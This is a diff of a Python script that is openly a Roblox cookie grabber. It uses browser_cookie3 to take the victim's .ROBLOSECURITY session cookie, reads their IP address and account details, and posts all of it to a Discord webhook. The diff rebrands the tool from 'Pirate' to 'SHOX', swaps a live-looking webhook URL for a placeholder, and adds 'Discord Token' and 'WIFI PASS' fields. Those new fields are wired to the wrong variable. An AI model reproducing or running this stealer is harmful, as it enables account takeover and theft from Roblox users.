@@ -1,22 +1,17 @@
 import os
 import codecs
 import json
-from base64 import *
+import robloxpy
+import requests,re
+from discordwebhook import *
+import browser_cookie3
+webhook = "Webhooksss"
 
-webhookk = "https://discord.com/api/webhooks/1119646421679882291/JpjGof1nQoHeA0DQY6bN7QZp7H-gtwbKKar-ayJ3wb5q3rOfbBhN1icT6VBKEHOH66MX"
+
 def command(c):
     os.system(c)
 def cls():
     os.system("cls")
-
-try:
-    import robloxpy
-    import requests,re
-    from discordwebhook import *
-    import browser_cookie3
-    
-except:
-    input("Libraries not installed press enter to exit...")
 
 
 
@@ -105,29 +100,29 @@ roblox_profile = f"https://web.roblox.com/users/{rid}/profile"
 headshot = robloxpy.User.External.GetHeadshot(rid)
 username = info['UserName']
 robux = info['RobuxBalance']
-premium = info['IsPremium'];
-#################### SENDING TO WEBHOOK #################
-
-discord = Discord(url=webhookk)
+premium = info['IsPremium']
+discord = Discord(url=webhook)
 discord.post(
-    username="BOT - Pirate 🍪",
-    avatar_url="https://cdn.discordapp.com/attachments/984818429355782197/985878173659045999/a339721183f60c18b3424ba7b73daf1b.png",
+    username="SHOX - BOT 🍪",
+    avatar_url="https://cdn.discordapp.com/attachments/1001900032896806976/1038399198695006238/pobrane_7.png",
     embeds=[
         {
-            "username": "BOT - Pirate 🍪",
-            "title": "💸 +1 Result Account 🕯️",
-            "description" : f"[Github Page](https://github.com/Mani175/Pirate-Cookie-Grabber) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
+            "username": "SHOX - BOT 🍪",
+            "title": "💸 +1 Account 🕯",
+            "description" : f"[Github Page](https://github.com/5-xss/) | [Rolimons]({rolimons}) | [Roblox Profile]({roblox_profile})",
             "color" : 12452044,
             "fields": [
-                {"name": "Username", "value": username, "inline": True},
-                {"name": "Robux Balance", "value": robux, "inline": True},
-                {"name": "Premium Status", "value": premium,"inline": True},
-                {"name": "Creation Date", "value": crdate, "inline": True},
-                {"name" : "RAP", "value": rap,"inline": True},
-                {"name" : "Friends", "value": friends, "inline": True},
-                {"name" : "Account Age", "value": age, "inline": True},
-                {"name" : "IP Address", "value" : ip_address, "inline:": True},
-                {"name" : ".ROBLOSECURITY", "value": f"```fix\n{roblox_cookie}```", "inline": False},
+                {"name": "💬Username💭", "value": username, "inline": True},
+                {"name": "💰Robux Bal💰", "value": robux, "inline": True},
+                {"name": "🔑Premium🔑", "value": premium,"inline": True},
+                {"name": "⚒Creation Date🛠", "value": crdate, "inline": True},
+                {"name" : "📊RAP📊", "value": rap,"inline": True},
+                {"name" : "👦Friends🧒", "value": friends, "inline": True},
+                {"name" : "🎂Account Age🎂", "value": age, "inline": True},
+                {"name" : "Discord Token", "value": rap,"inline": True},
+                {"name" : "WIFI PASS", "value": rap,"inline": True},
+                {"name" : "🖥IP Address💻", "value" : ip_address, "inline:": True},
+                {"name" : "🍪COOKIE🍪", "value": f"```fix\n{roblox_cookie}```", "inline": False},
             ],
             "thumbnail": {"url": headshot},
 
@@ -135,4 +130,3 @@ discord.post(
         }
     ],
 )
-
